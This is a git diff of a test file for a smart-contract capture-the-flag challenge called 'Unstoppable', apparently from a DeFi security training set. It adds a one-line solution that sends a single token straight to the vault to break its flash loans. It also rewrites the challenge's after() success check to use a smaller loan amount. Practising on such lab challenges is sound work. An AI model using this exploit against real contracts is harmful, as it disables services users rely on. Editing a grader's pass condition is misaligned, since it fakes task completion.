@@ -45,6 +45,7 @@ describe('[Challenge] Unstoppable', function () {
 
     it('Execution', async function () {
         /** CODE YOUR SOLUTION HERE */
+        await token.connect(player).transfer(vault.address, 1);
     });
 
     after(async function () {
@@ -52,7 +53,7 @@ describe('[Challenge] Unstoppable', function () {
 
         // It is no longer possible to execute flash loans
         await expect(
-            receiverContract.executeFlashLoan(100n * 10n ** 18n)
+            receiverContract.executeFlashLoan(10)
         ).to.be.reverted;
     });
 });
